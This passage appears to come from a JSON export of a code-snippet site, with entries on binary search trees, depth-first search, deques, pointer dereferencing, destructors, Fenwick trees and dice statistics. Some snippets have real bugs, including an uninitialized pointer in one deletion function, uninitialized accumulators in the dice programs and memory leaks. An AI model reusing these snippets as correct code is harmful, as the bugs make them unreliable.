    "description": "//insertion;deletion;searching;dispaly;menu driven program ;(BINARY SEARCH TREE) #include <iostream>  using namespace std; class node { public:     int data;     node*right;     node*left; }; node*getnewnode(int val) {     node *temp=new node;     temp->data=val;     temp->left=NULL;     temp->right=NULL;    return temp; } int getrightmin(node*root) {     node*temp=new node;     temp=root;     while(temp->left!=NULL)     {         temp=temp->left;     }     return temp->data; } node*insertbst(node*root,int val) {     if(root==NULL)     {         return getnewnode(val);     }     if(root->data>val)     {         root->left= insertbst(root->left,val);     }     else     {         root->right= insertbst(root->right,val);     }     return root; } int searchbst(node*root,int val) {     if(root==NULL)     {         return 0;     }     if(root->data==val)     {         return 1;     }     if(root->data<val)     {         return searchbst(root->right,val);     }     else     {         return searchbst(root->left,val);     } } node*removebst(node*root,int val) {     if(root==NULL)     {         return 0;     }     if(root->data>val)     {         root->left=removebst(root->left,val);     }     else if(root->data<val)     {         root->right=removebst(root->right,val);     }     else     {         if(root->left==NULL&&root->right==NULL)         {             delete root;             return NULL;         }         else if(root->left==NULL)         {             node*temp=new node;             temp=root->right;             delete root;             return temp;         }         else if(root->right==NULL)         {             node*temp=new node;             temp=root->left;             delete root;             return temp;         }         else         {             int min=getrightmin(root->right);             root->data=min;             root->right=removebst(root->right,min);         }     }     return root; } void inorder(node*root) {     if(root==NULL)     {         return;     }     inorder(root->left);     cout<<root->data<<\" \";     inorder(root->right); } int main() {     node*root=new node;     root=NULL;     while(1)     {         int value;         cout<<\"1.Insert to bst\"<<endl<<\"2.search in bst:\"<<endl<<\"3.display ordered bst\"<<endl<<\"4. exit\"<<endl<<\"5. delete \"<<endl;         int n;         cout<<\"enter your choice:\"<<endl;         cin>>n;         switch(n)         {         case 1:             {                 cout<<\"enter the value to be inserted:\"<<endl;                 cin>>value;                 root=insertbst(root,value);                 break;             }         case 2:             {                 cout<<\"enter the value you want to search:\"<<endl;                 int search;                 cin>>search;                 int s=searchbst(root,search);                 if(s==1)                 {                     cout<<\"value found\"<<endl;                 }                 else                 {                     cout<<\"value not found:\"<<endl;                 }                 break;             }         case 3:             {                 inorder(root);                 cout<<endl;                 break;             }         case 4:             {                 exit(0);                 break;             }         case 5:             {                 int val;                 cout<<\"enter the value to be deleted:\"<<endl;                 cin>>val;                 removebst(root,val);                 break;              }         default:             {                 cout<<\"invalid choice given:\"<<endl;                 break;             }          }     }     return 0; } \n/* This is just the deletion function you need to write the required code. \tThank you. */  void deleteNode(Node *root, int data) {     if(root == NULL)     {         cout << \"Tree is empty\\n\";         return;     }      queue<Node*> q;     q.push(root);      while(!q.empty())     {         Node *temp = q.front();         q.pop();          if(temp->data == data)         {             Node *current = root;             Node *prev;              while(current->right != NULL)             {                 prev = current;                 current = current->right;             }              temp->data = current->data;             prev->right = NULL;             free(current);              cout << \"Deleted\\n\";              return;         }          if(temp->left != NULL)             q.push(temp->left);         if(temp->right != NULL)             q.push(temp->right);     }      cout << \"Node not found for deletion\\n\"; }\n",
    "reg_date": "2021-10-12T11:39:46.000Z"
  },
  {
    "id": 1824,
    "keyword": null,
    "link": null,
    "title": " deliberation meaning",
    "description": "Dont use in ppt (used in negative sentence)\n",
    "reg_date": "2021-10-12T11:39:46.000Z"
  },
  {
    "id": 1825,
    "keyword": null,
    "link": null,
    "title": " depth first search",
    "description": "# left to right, pre-order depth first tree search, iterative. O(n) time/space def depthFirstSearch(root):     st = [root]     while st:         current = st.pop()         print(current)         if current.right is not None: st.append(current.right)          if current.left is not None: st.append(current.left)\n// performs a depth first search (DFS) // nodes are number from 1 to n, inclusive #include <bits/stdc++.h> using namespace std;   vector<vector<int>> adj;  // adjacency list // visited[v] = true if v has been visited by dfs vector<bool> visited;  bool all_edges_are_directed = true;  void dfs(int v) {     // determines if dfs has been done on v     if(visited[v])         return;     visited[v] = true;      // write code here to do stuff with node v      // traverse nodes that are adjacent to v     for (int u: adj[v]){         dfs(u);     } }  int main() {     int n;  // number of vertices     int m;  // number of edges     cin >> n >> m;     adj = vector<vector<int>>(n+1, vector<int>());     visited = vector<bool>(n+1, false);      for(int i = 0; i < m; ++i) {         // nodes a and b have an edge between them         int a, b;         cin >> a >> b;          if(all_edges_are_directed)             adj[a].push_back(b);         else {             adj[a].push_back(b);             adj[b].push_back(a);         }     }          // do depth first search on all nodes     for(int i = 1; i <= n; ++i){         dfs(i);     } }\n#include<bits/stdc++.h> using namespace std; void addedge(vector<int>adj[],int u,int v) {     adj[u].push_back(v);     adj[v].push_back(u); } void dfs_u(int u,vector<int>adj[],vector<bool>& visited) {     visited[u]=true;     cout<<u<<\" \";     int n=adj[u].size();     for(int i=0;i<n;i++)     {         if(visited[adj[u][i]]==false)         {             dfs_u(adj[u][i],adj,visited);         }     } } void dfs(vector<int>adj[],int v) {     vector<bool> visited(v,false);     for(int i=0;i<v;i++)     {         if(visited[i]==false)         {             dfs_u(i,adj,visited);         }     } } int main() {     int vertix;     cout<<\"Enter the number of vertex :\"<<endl;     cin>>vertix;     int edges;     cout<<\"Enter the number of edges:\"<<endl;     cin>>edges;     vector<int>graph_dfs[vertix];     int a,b;     cout<<\"enter all the vertex pair that are connected:\"<<endl;     for(int i=0;i<edges;i++)     {         cin>>a>>b;         addedge(graph_dfs,a,b);     }     cout<<\"Depth first search view:\"<<endl;     dfs(graph_dfs,vertix); } \n    DFS-iterative (G, s):                                   //Where G is graph and s is source vertex       let S be stack       S.push( s )            //Inserting s in stack        mark s as visited.       while ( S is not empty):           //Pop a vertex from stack to visit next           v  =  S.top( )          S.pop( )          //Push all the neighbours of v in stack that are not visited            for all neighbours w of v in Graph G:             if w is not visited :                      S.push( w )                              mark w as visited       DFS-recursive(G, s):         mark s as visited         for all neighbours w of s in Graph G:             if w is not visited:                 DFS-recursive(G, w)\n# HAVE USED ADJACENY LIST class Graph:     def __init__(self,lst=None):         self.lst=dict()         if lst is None:             pass         else:             self.lst=lst     def find_path(self,start,end):         self.checklist={}         for i in self.lst.keys():             self.checklist[i]=False         self.checklist[start]=True         store,extra=(self.explore(start,end))         if store==False:             print('No Path Found')         else:             print(extra)     def explore(self,start,end):         while True:             q=[]                     #print(self.checklist,q)             q.append(start)             flag=False                         for i in self.lst[start]:                 if i==end:                     q.append(i)                     return True,q                 if self.checklist[i]:                     pass                 else:                     flag=True                     self.checklist[i]=True                     q.append(i)                     break                if flag:                 store,extra=self.explore(q[-1],end)                  if store==False:                     q.pop()                     if len(q)==0:return False                     return self.explore(q[-1],end)                 elif store==None:                     pass                 elif store==True:                     q.pop()                     q.extend(extra)                     return True,q             else:                 return False,None     def __str__(self):return str(self.lst) if __name__=='__main__':     store={1: [2, 3, 4], 2: [3, 1], 3: [2, 1], 4: [5, 8, 1], 5: [4, 6, 7], 6: [5, 7, 9, 8], 7: [5, 6], 8: [4, 6, 9], 9: [6, 8, 10], 10: [9],11:[12,13]}     a=Graph(store)     a.find_path(1,11) # No Path Found      a.find_path(1,6)# [1, 4, 5, 6]         a.find_path(3,10)   # [3, 2, 1, 4, 5, 6, 9, 10]      a.find_path(4,10)# [4, 5, 6, 9, 10]     print(a) #\n",
    "reg_date": "2021-10-12T11:39:46.000Z"
  },
  {
    "id": 1826,
    "keyword": null,
    "link": null,
    "title": " depth first search graph",
    "description": "############### #The Algorithm (In English):  # 1) Pick any node.  # 2) If it is unvisited, mark it as visited and recur on all its  #    adjacent nodes.  # 3) Repeat until all the nodes are visited, or the node to be  #    searched is found.   # The graph below (declared as a Python dictionary) # is from the linked website and is used for the sake of # testing the algorithm. Obviously, you will have your own # graph to iterate through. graph = {     'A' : ['B','C'],     'B' : ['D', 'E'],     'C' : ['F'],     'D' : [],     'E' : ['F'],     'F' : [] }  visited = set() # Set to keep track of visited nodes.   ################## # The Algorithm (In Code)  def dfs(visited, graph, node):     if node not in visited:         print (node)         visited.add(node)         for neighbour in graph[node]:             dfs(visited, graph, neighbour)              # Driver Code to test in python yourself. # Note that when calling this, you need to # call the starting node. In this case it is 'A'. dfs(visited, graph, 'A')  # NOTE: There are a few ways to do DFS, depending on what your # variables are and/or what you want returned. This specific # example is the most fleshed-out, yet still understandable, # explanation I could find.\n#include <bits/stdc++.h> using namespace std;    class Graph {     int V;          list<int>* adj;          void DFSUtil(int v, bool visited[]);   public:     Graph(int V);       void addEdge(int v, int w);          void DFS(int v); };   Graph::Graph(int V) {     this->V = V;     adj = new list<int>[V]; }   void Graph::addEdge(int v, int w) {     adj[v].push_back(w);  }   void Graph::DFSUtil(int v, bool visited[]) {         visited[v] = true;     cout << v << \" \";           list<int>::iterator i;     for (i = adj[v].begin(); i != adj[v].end(); ++i)         if (!visited[*i])             DFSUtil(*i, visited); }    void Graph::DFS(int v) {         bool* visited = new bool[V];     for (int i = 0; i < V; i++)         visited[i] = false;         DFSUtil(v, visited); }    int main() {        Graph g(4);     g.addEdge(0, 1);     g.addEdge(0, 2);     g.addEdge(1, 2);     g.addEdge(2, 0);     g.addEdge(2, 3);     g.addEdge(3, 3);       cout << \"Following is Depth First Traversal\"             \" (starting from vertex 2) \\n\";     g.DFS(2);       return 0; }\n// performs a depth first search (DFS) // nodes are number from 1 to n, inclusive #include <bits/stdc++.h> using namespace std;   vector<vector<int>> adj;  // adjacency list // visited[v] = true if v has been visited by dfs vector<bool> visited;  bool all_edges_are_directed = true;  void dfs(int v) {     // determines if dfs has been done on v     if(visited[v])         return;     visited[v] = true;      // write code here to do stuff with node v      // traverse nodes that are adjacent to v     for (int u: adj[v]){         dfs(u);     } }  int main() {     int n;  // number of vertices     int m;  // number of edges     cin >> n >> m;     adj = vector<vector<int>>(n+1, vector<int>());     visited = vector<bool>(n+1, false);      for(int i = 0; i < m; ++i) {         // nodes a and b have an edge between them         int a, b;         cin >> a >> b;          if(all_edges_are_directed)             adj[a].push_back(b);         else {             adj[a].push_back(b);             adj[b].push_back(a);         }     }          // do depth first search on all nodes     for(int i = 1; i <= n; ++i){         dfs(i);     } }\n#include<bits/stdc++.h> using namespace std; void addedge(vector<int>adj[],int u,int v) {     adj[u].push_back(v);     adj[v].push_back(u); } void dfs_u(int u,vector<int>adj[],vector<bool>& visited) {     visited[u]=true;     cout<<u<<\" \";     int n=adj[u].size();     for(int i=0;i<n;i++)     {         if(visited[adj[u][i]]==false)         {             dfs_u(adj[u][i],adj,visited);         }     } } void dfs(vector<int>adj[],int v) {     vector<bool> visited(v,false);     for(int i=0;i<v;i++)     {         if(visited[i]==false)         {             dfs_u(i,adj,visited);         }     } } int main() {     int vertix;     cout<<\"Enter the number of vertex :\"<<endl;     cin>>vertix;     int edges;     cout<<\"Enter the number of edges:\"<<endl;     cin>>edges;     vector<int>graph_dfs[vertix];     int a,b;     cout<<\"enter all the vertex pair that are connected:\"<<endl;     for(int i=0;i<edges;i++)     {         cin>>a>>b;         addedge(graph_dfs,a,b);     }     cout<<\"Depth first search view:\"<<endl;     dfs(graph_dfs,vertix); } \n    DFS-iterative (G, s):                                   //Where G is graph and s is source vertex       let S be stack       S.push( s )            //Inserting s in stack        mark s as visited.       while ( S is not empty):           //Pop a vertex from stack to visit next           v  =  S.top( )          S.pop( )          //Push all the neighbours of v in stack that are not visited            for all neighbours w of v in Graph G:             if w is not visited :                      S.push( w )                              mark w as visited       DFS-recursive(G, s):         mark s as visited         for all neighbours w of s in Graph G:             if w is not visited:                 DFS-recursive(G, w)\n# HAVE USED ADJACENY LIST class Graph:     def __init__(self,lst=None):         self.lst=dict()         if lst is None:             pass         else:             self.lst=lst     def find_path(self,start,end):         self.checklist={}         for i in self.lst.keys():             self.checklist[i]=False         self.checklist[start]=True         store,extra=(self.explore(start,end))         if store==False:             print('No Path Found')         else:             print(extra)     def explore(self,start,end):         while True:             q=[]                     #print(self.checklist,q)             q.append(start)             flag=False                         for i in self.lst[start]:                 if i==end:                     q.append(i)                     return True,q                 if self.checklist[i]:                     pass                 else:                     flag=True                     self.checklist[i]=True                     q.append(i)                     break                if flag:                 store,extra=self.explore(q[-1],end)                  if store==False:                     q.pop()                     if len(q)==0:return False                     return self.explore(q[-1],end)                 elif store==None:                     pass                 elif store==True:                     q.pop()                     q.extend(extra)                     return True,q             else:                 return False,None     def __str__(self):return str(self.lst) if __name__=='__main__':     store={1: [2, 3, 4], 2: [3, 1], 3: [2, 1], 4: [5, 8, 1], 5: [4, 6, 7], 6: [5, 7, 9, 8], 7: [5, 6], 8: [4, 6, 9], 9: [6, 8, 10], 10: [9],11:[12,13]}     a=Graph(store)     a.find_path(1,11) # No Path Found      a.find_path(1,6)# [1, 4, 5, 6]         a.find_path(3,10)   # [3, 2, 1, 4, 5, 6, 9, 10]      a.find_path(4,10)# [4, 5, 6, 9, 10]     print(a) #\n",
    "reg_date": "2021-10-12T11:39:46.000Z"
  },
  {
    "id": 1827,
    "keyword": null,
    "link": null,
    "title": " deque c++",
    "description": "/*  A deque is a dynamic array whose size can be efficiently  changed at both ends of the array. Like a vector, a deque provides the functions push_back and pop_back, but it also includes the  functions push_front and pop_front. */ deque<int> d; d.push_back(5); // [5] d.push_back(2); // [5,2] d.push_front(3); // [3,5,2] d.pop_back(); // [3,5] d.pop_front(); // [5]\n",
    "reg_date": "2021-10-12T11:39:46.000Z"
  },
  {
    "id": 1828,
    "keyword": null,
    "link": null,
    "title": " deque problem hacker rank",
    "description": "#include <iostream> #include <deque>  using namespace std;  void printKMax(int arr[], int n, int k){ \t//Write your code here.     deque<int> dq;          for (int i=0; i<n; i++){                  // base case for first element         if (dq.empty()){             dq.push_back(i);         }                  // remove elements outside the current window         if (dq.front() <= (i - k)){             dq.pop_front();         }                  // move max element to the front         while (!dq.empty() && arr[i] >= arr[dq.back()]){             dq.pop_back();         }                  dq.push_back(i);                  // print out only when the first window is completed         if (i >= (k - 1)){             cout << arr[dq.front()] << \" \";         }         }     cout << endl; }  int main(){    \tint t; \tcin >> t; \twhile(t>0) { \t\tint n,k;     \tcin >> n >> k;     \tint i;     \tint arr[n];     \tfor(i=0;i<n;i++)       \t\tcin >> arr[i];     \tprintKMax(arr, n, k);     \tt--;   \t}   \treturn 0; }\n",
    "reg_date": "2021-10-12T11:39:46.000Z"
  },
  {
    "id": 1829,
    "keyword": null,
    "link": null,
    "title": " deque stl",
    "description": "#include<iostream> #include<deque> #include<algorithm> using namespace std; int main() {     ios_base::sync_with_stdio(false);     cin.tie(NULL);     deque<int>d;     d.push_back(50);     d.push_back(75);     d.push_front(25);     d.push_front(10);     d.push_back(100);     for(deque<int>::iterator it=d.begin();it!=d.end();it++)     {         cout<<*it<<endl;     }     cout<<\"-----------------------\"<<endl;     d.pop_back();     d.pop_front();     for(deque<int>::iterator it=d.begin();it!=d.end();it++)     {         cout<<*it<<endl;     }     cout<<\"-----------------------\"<<endl;     auto it1=d.begin()+1;     d.insert(it1,5,30);     for(deque<int>::iterator it=d.begin();it!=d.end();it++)     {         cout<<*it<<endl;     }     cout<<\"-----------------------\"<<endl;     deque<int>d1{10,20,30,40,50};     d.insert(it1,d1.begin(),d1.end());     for(deque<int>::iterator it=d.begin();it!=d.end();it++)     {         cout<<*it<<endl;     }     cout<<\"-----------------------\"<<endl; return 0; } \n",
    "reg_date": "2021-10-12T11:39:46.000Z"
  },
  {
    "id": 1830,
    "keyword": null,
    "link": null,
    "title": " deques  in c++",
    "description": " // A CPP program to demonstrate linked list   // based implementation of queue   #include <bits/stdc++.h>  using namespace std;     // A linked list (LL) node to store a queue entry   class QNode   {       public:      int key;       QNode *next;   };      // The queue, front stores the front node  // of LL and rear stores ths last node of LL   class Queue   {       public:      QNode *front, *rear;   };      // A utility function to create   // a new linked list node.   QNode* newNode(int k)   {       QNode *temp = new QNode();      temp->key = k;       temp->next = NULL;       return temp;   }      // A utility function to create an empty queue   Queue *createQueue()   {       Queue *q = new Queue();      q->front = q->rear = NULL;       return q;   }      // The function to add a key k to q   void enQueue(Queue *q, int k)   {       // Create a new LL node       QNode *temp = newNode(k);          // If queue is empty, then       // new node is front and rear both       if (q->rear == NULL)       {       q->front = q->rear = temp;       return;       }          // Add the new node at       // the end of queue and change rear       q->rear->next = temp;       q->rear = temp;   }      // Function to remove  // a key from given queue q   QNode *deQueue(Queue *q)   {       // If queue is empty, return NULL.       if (q->front == NULL)       return NULL;          // Store previous front and       // move front one node ahead       QNode *temp = q->front;       q->front = q->front->next;          // If front becomes NULL, then       // change rear also as NULL       if (q->front == NULL)       q->rear = NULL;       return temp;   }      // Driver code   int main()   {       Queue *q = createQueue();       enQueue(q, 10);       enQueue(q, 20);       deQueue(q);       deQueue(q);       enQueue(q, 30);       enQueue(q, 40);       enQueue(q, 50);       QNode *n = deQueue(q);       if (n != NULL)       cout << \"Dequeued item is \" << n->key;       return 0;   }     \n",
    "reg_date": "2021-10-12T11:39:47.000Z"
  },
  {
    "id": 1831,
    "keyword": null,
    "link": null,
    "title": " dereference pointer c++",
    "description": "int number; int value; int * pNumber;  number = 5; pNumber = &number;  assert(pNumber); // check before dereferenceing to prevent errors value = *pNumber // Use * to dereference the pointer\nvalue = *pointer // Use * to dereference the pointer\n",
    "reg_date": "2021-10-12T11:39:47.000Z"
  },
  {
    "id": 1832,
    "keyword": null,
    "link": null,
    "title": " dereference pointer c",
    "description": "int number; int value; int * pNumber;  number = 5; pNumber = &number;  assert(pNumber); // check before dereferenceing to prevent errors value = *pNumber // Use * to dereference the pointer\nint x = 5; int *p = &x;  x = x + 4; x = *p + 4; *p = *p + 4; cout << x; //Output is 17\n",
    "reg_date": "2021-10-12T11:39:47.000Z"
  },
  {
    "id": 1833,
    "keyword": null,
    "link": null,
    "title": " dereferencing pointer in cpp",
    "description": "int x = 5; int *p = &x;  x = x + 4; x = *p + 4; *p = *p + 4;  cout << x; //Output is 17\nint number; int value; int * pNumber;  number = 5; pNumber = &number;  assert(pNumber); // check before dereferenceing to prevent errors value = *pNumber // Use * to dereference the pointer\nvalue = *pointer // Use * to dereference the pointer\n",
    "reg_date": "2021-10-12T11:39:47.000Z"
  },
  {
    "id": 1834,
    "keyword": null,
    "link": null,
    "title": " descending order c++",
    "description": "sort(begin(arr), end(arr), greater<>())\n",
    "reg_date": "2021-10-12T11:39:47.000Z"
  },
  {
    "id": 1835,
    "keyword": null,
    "link": null,
    "title": " destin'y child",
    "description": "now this isn't coding\n",
    "reg_date": "2021-10-12T11:39:47.000Z"
  },
  {
    "id": 1836,
    "keyword": null,
    "link": null,
    "title": " destiny child",
    "description": "now this isn't coding\n",
    "reg_date": "2021-10-12T11:39:47.000Z"
  },
  {
    "id": 1837,
    "keyword": null,
    "link": null,
    "title": " destructor in c++",
    "description": "#include <iostream> class Entity { \t public: \tfloat x, y; \tEntity() { \t\tx = 0.0f; \t\ty = 0.0f;       // the above is not a good practice ,instead you can use constructor member initializer list to initialize variables \t\tstd::cout << \"Created Entity\" << std::endl; \t\tstd::cout << \"x \" << x << \" y \" << y << std::endl; \t\t//This is a constructor and it gets called everytime we instantiate an object \t\t \t} \t~Entity() { \t\t//This is a destructor object it gets called every time object is destroyed or its scope ends \t\t//Note1:that this function can never return anything  \t\t//Note2:Followed by this ~ symbol the name of the function must be equal to class name \t\tstd::cout << \"[Destroyed Entity]\" << std::endl; \t} };  int main(){ \t{ \t\tEntity e1;       //here constructor is called and output => Created Entity        //here constructor is called and output => 0,0 \t}   //here Destructor is called and output => Destroyed Entity   // Destructor will get called here when compiler will get out of the end bracket and the lifetime of object ends \t // have a graeater look in debug mode \tstd::cin.get(); }\n#include <iostream> using namespace std; class HelloWorld{ public:   //Constructor   HelloWorld(){     cout<<\"Constructor is called\"<<endl;   }   //Destructor   ~HelloWorld(){     cout<<\"Destructor is called\"<<endl;    }    //Member function    void display(){      cout<<\"Hello World!\"<<endl;    } }; int main(){    //Object created    HelloWorld obj;    //Member function called    obj.display();    return 0; }\nclass A {     // constructor     A()     {         cout << \"Constructor called\";     }      // destructor     ~A()     {         cout << \"Destructor called\";     } };  int main() {     A obj1;   // Constructor Called     int x = 1     if(x)     {         A obj2;  // Constructor Called     }   // Destructor Called for obj2 } //  Destructor called for obj1 \nclass Line {    public:       Line();   // This is the constructor declaration       ~Line();  // This is the destructor: declaration };\n",
    "reg_date": "2021-10-12T11:39:47.000Z"
  },
  {
    "id": 1838,
    "keyword": null,
    "link": null,
    "title": " detect cycle in an undirected graph c++",
    "description": "// A C++ Program to detect // cycle in an undirected graph #include<iostream> #include <list> #include <limits.h> using namespace std;   // Class for an undirected graph class Graph {           // No. of vertices     int V;           // Pointer to an array     // containing adjacency lists     list<int> *adj;      bool isCyclicUtil(int v, bool visited[],                               int parent); public:         // Constructor     Graph(int V);           // To add an edge to graph     void addEdge(int v, int w);         // Returns true if there is a cycle     bool isCyclic();  };   Graph::Graph(int V) {     this->V = V;     adj = new list<int>[V]; }   void Graph::addEdge(int v, int w) {           // Add w to v&rsquo;s list.     adj[v].push_back(w);         // Add v to w&rsquo;s list.     adj[w].push_back(v); }   // A recursive function that // uses visited[] and parent to detect // cycle in subgraph reachable // from vertex v. bool Graph::isCyclicUtil(int v,                 bool visited[], int parent) {           // Mark the current node as visited     visited[v] = true;       // Recur for all the vertices     // adjacent to this vertex     list<int>::iterator i;     for (i = adj[v].begin(); i !=                        adj[v].end(); ++i)     {                   // If an adjacent vertex is not visited,         //then recur for that adjacent         if (!visited[*i])         {            if (isCyclicUtil(*i, visited, v))               return true;         }           // If an adjacent vertex is visited and         // is not parent of current vertex,         // then there exists a cycle in the graph.         else if (*i != parent)            return true;     }     return false; }   // Returns true if the graph contains // a cycle, else false. bool Graph::isCyclic() {           // Mark all the vertices as not     // visited and not part of recursion     // stack     bool *visited = new bool[V];     for (int i = 0; i < V; i++)         visited[i] = false;       // Call the recursive helper     // function to detect cycle in different     // DFS trees     for (int u = 0; u < V; u++)     {                 // Don't recur for u if         // it is already visited         if (!visited[u])           if (isCyclicUtil(u, visited, -1))              return true;     }     return false; }   // Driver program to test above functions int main() {     Graph g1(5);     g1.addEdge(1, 0);     g1.addEdge(0, 2);     g1.addEdge(2, 1);     g1.addEdge(0, 3);     g1.addEdge(3, 4);     g1.isCyclic()?        cout << \"Graph contains cycle\\n\":        cout << \"Graph doesn't contain cycle\\n\";       Graph g2(3);     g2.addEdge(0, 1);     g2.addEdge(1, 2);     g2.isCyclic()?        cout << \"Graph contains cycle\\n\":        cout << \"Graph doesn't contain cycle\\n\";       return 0; }\n",
    "reg_date": "2021-10-12T11:39:48.000Z"
  },
  {
    "id": 1839,
    "keyword": null,
    "link": null,
    "title": " detect end of user input cpp",
    "description": "while (cin.peek() != EOF) {   // To do your stuff...   // NOTE: peek() will set failbit when peeking end of stream and return EOF(-1). }\n",
    "reg_date": "2021-10-12T11:39:48.000Z"
  },
  {
    "id": 1840,
    "keyword": null,
    "link": null,
    "title": " dev c++",
    "description": "I see, a man of culture!\n",
    "reg_date": "2021-10-12T11:39:48.000Z"
  },
  {
    "id": 1841,
    "keyword": null,
    "link": null,
    "title": " dev c++ tahe last word error",
    "description": "\tfor (int i=1;i<=3;i=i+1) \t{ \t\tprintf(\"Pedir a nota: \"); \t\tscanf(\"%i\",&s); \t\tn=n+s;\n",
    "reg_date": "2021-10-12T11:39:48.000Z"
  },
  {
    "id": 1842,
    "keyword": null,
    "link": null,
    "title": " dfenwick tree code c++",
    "description": "// C++ code to demonstrate operations of Binary Index Tree  #include <iostream>     using namespace std;     /*         n --> No. of elements present in input array.       BITree[0..n] --> Array that represents Binary Indexed Tree.      arr[0..n-1] --> Input array for which prefix sum is evaluated. */    // Returns sum of arr[0..index]. This function assumes  // that the array is preprocessed and partial sums of  // array elements are stored in BITree[].  int getSum(int BITree[], int index)  {      int sum = 0; // Iniialize result         // index in BITree[] is 1 more than the index in arr[]      index = index + 1;         // Traverse ancestors of BITree[index]      while (index>0)      {          // Add current element of BITree to sum          sum += BITree[index];             // Move index to parent node in getSum View          index -= index & (-index);      }      return sum;  }     // Updates a node in Binary Index Tree (BITree) at given index  // in BITree. The given value 'val' is added to BITree[i] and   // all of its ancestors in tree.  void updateBIT(int BITree[], int n, int index, int val)  {      // index in BITree[] is 1 more than the index in arr[]      index = index + 1;         // Traverse all ancestors and add 'val'      while (index <= n)      {      // Add 'val' to current node of BI Tree      BITree[index] += val;         // Update index to that of parent in update View      index += index & (-index);      }  }     // Constructs and returns a Binary Indexed Tree for given  // array of size n.  int *constructBITree(int arr[], int n)  {      // Create and initialize BITree[] as 0      int *BITree = new int[n+1];      for (int i=1; i<=n; i++)          BITree[i] = 0;         // Store the actual values in BITree[] using update()      for (int i=0; i<n; i++)          updateBIT(BITree, n, i, arr[i]);         // Uncomment below lines to see contents of BITree[]      //for (int i=1; i<=n; i++)      //     cout << BITree[i] << \" \";         return BITree;  }        // Driver program to test above functions  int main()  {      int freq[] = {2, 1, 1, 3, 2, 3, 4, 5, 6, 7, 8, 9};      int n = sizeof(freq)/sizeof(freq[0]);      int *BITree = constructBITree(freq, n);      cout << \"Sum of elements in arr[0..5] is \"         << getSum(BITree, 5);         // Let use test the update operation      freq[3] += 6;      updateBIT(BITree, n, 3, 6); //Update BIT for above change in arr[]         cout << \"\\nSum of elements in arr[0..5] after update is \"         << getSum(BITree, 5);         return 0;  } \n",
    "reg_date": "2021-10-12T11:39:48.000Z"
  },
  {
    "id": 1843,
    "keyword": null,
    "link": null,
    "title": " diameter of tree using dfs",
    "description": "#include <bits/stdc++.h> using namespace std; #define pb push_back class Solution { public:    map <int ,int > l;    int best;    int node;    int dfs(int v, bool* visited, vector <int> graph[], int c = 0){       visited[v] = true;       int ans = 0;       for(int i = 0; i < graph[v].size(); i++){          if(!visited[graph[v][i]])ans = max(ans,dfs(graph[v][i], visited, graph, c+1));       }       if(c > best){          best = c;          node = v ;       }       visited[v] = false;       return max(c,ans);    }    int treeDiameter(vector<vector<int>>& e) {       int n = e.size();       vector <int> graph[n+1];       for(int i = 0; i < n; i++){          graph[e[i][0]].pb(e[i][1]);          graph[e[i][1]].pb(e[i][0]);       }       bool* visited = new bool[n+1]();       best = 0;       node = 0;       dfs(0, visited, graph);       bool* visited2 = new bool[n+1]();       return dfs(node, visited2, graph);    } }; main(){    vector<vector<int>> v = {{0,1},{1,2},{2,3},{1,4},{4,5}};    Solution ob;    cout <<ob.treeDiameter(v); }\n",
    "reg_date": "2021-10-12T11:39:48.000Z"
  },
  {
    "id": 1844,
    "keyword": null,
    "link": null,
    "title": " dice3",
    "description": "#include<iostream> #include<cstdlib> #include<ctime>  #include<iomanip> #include<vector> #include<cmath> #include<algorithm>  int main( ) {     std::cout << \"enter seeding number: \" ;      int num_seed = 0 ;     std::cin >> num_seed ;     srand( num_seed ) ;     std::cout << \"enter numbers of tries: \";     int tries = 0 ;     std::cin >> tries ;     std::cout << \"enter numbers of asterikes: \";      int asterikes = 0 ;     std::cin >> asterikes ;     double sum_of_three_dices , average_of_three_dices,sigme_dices_powered, variation, standard_dev = 0.0 ;     std::vector<size_t> vec_of_three_dice(19,0);     for(size_t i = 0; i < tries ; i++)     {         int dice_one = rand()%6 + 1 ;         int dice_two = rand()%6 + 1 ;         int dice_three = rand()%6 + 1 ;         vec_of_three_dice[dice_one + dice_two + dice_three] += 1 ;         sum_of_three_dices += dice_one + dice_two +dice_three ;         average_of_three_dices = sum_of_three_dices / tries ;         sigme_dices_powered += pow(dice_one + dice_two + dice_three ,2);         variation = sigme_dices_powered/tries - pow(average_of_three_dices,2);         standard_dev = sqrt(variation);     }      average_of_three_dices = sum_of_three_dices / tries ;     std::cout << \"average_of_three_dices is: \" <<std::fixed << std::setprecision(6) << average_of_three_dices << std::endl;                                                                                                                                                                                                                          /* 29421  796842 */     std::cout << \"standard deviation is: \" <<std::fixed << std::setprecision(6) << standard_dev << std::endl;     std::cout << std::endl;          int max_value = *max_element(vec_of_three_dice.begin(),vec_of_three_dice.end());     for(size_t i = 3; i <vec_of_three_dice.size() ; i ++ ){         if(i < 10 ){             std::cout <<std::setw(2) <<std::setfill(' ') << i<< \" : \" <<\"(\"<<std::setw(4)<<std::setfill(' ')<<vec_of_three_dice.at(i) << \")\" ;         }else{             std::cout << i << \" : \" <<\"(\"<<std::setw(4)<<std::setfill(' ')<<vec_of_three_dice.at(i) << \")\";         }        for(size_t j = 0; j <= static_cast<size_t>(vec_of_three_dice.at(i) * asterikes)/max_value ; j++ ){            std::cout << \"*\";        }         std::cout << std::endl;       }      return 0 ; }\n",
    "reg_date": "2021-10-12T11:39:48.000Z"
  },
  {
    "id": 1845,
    "keyword": null,
    "link": null,
    "title": " dice game c++ with standard deviation",
    "description": "#include<iostream> #include<cstdlib> #include<ctime>  #include<iomanip> #include<vector> #include<cmath> #include<algorithm>   int main( ) {     std::cout << \"enter seeding number: \" ;      int num_seed = 0 ;     std::cin >> num_seed ;     srand( num_seed ) ;     std::cout << \"enter numbers of tries: \";     int tries = 0 ;     std::cin >> tries ;     std::cout << \"enter numbers of asterikes: \";      int asterikes = 0 ;     std::cin >> asterikes ;      double sum_of_three_dices , average_of_three_dices,sigme_dices_powered, variation, standard_dev = 0.0 ;     std::vector<size_t> vec_of_three_dice(19,0);     for(size_t i = 0; i < tries ; i++)     {         int dice_one = rand()%6 + 1 ;         int dice_two = rand()%6 + 1 ;         int dice_three = rand()%6 + 1 ;         vec_of_three_dice[dice_one + dice_two + dice_three] += 1 ;         sum_of_three_dices += dice_one + dice_two +dice_three ;         average_of_three_dices = sum_of_three_dices / tries ;         sigme_dices_powered += pow(dice_one + dice_two + dice_three ,2);         variation = sigme_dices_powered/tries - pow(average_of_three_dices,2);         standard_dev = sqrt(variation);     }      average_of_three_dices = sum_of_three_dices / tries ;     std::cout << \"average_of_three_dices is: \" <<std::fixed << std::setprecision(3) << average_of_three_dices << std::endl;     std::cout << \"standard deviation is: \" <<std::fixed << std::setprecision(3) << standard_dev << std::endl;     std::cout << std::endl;     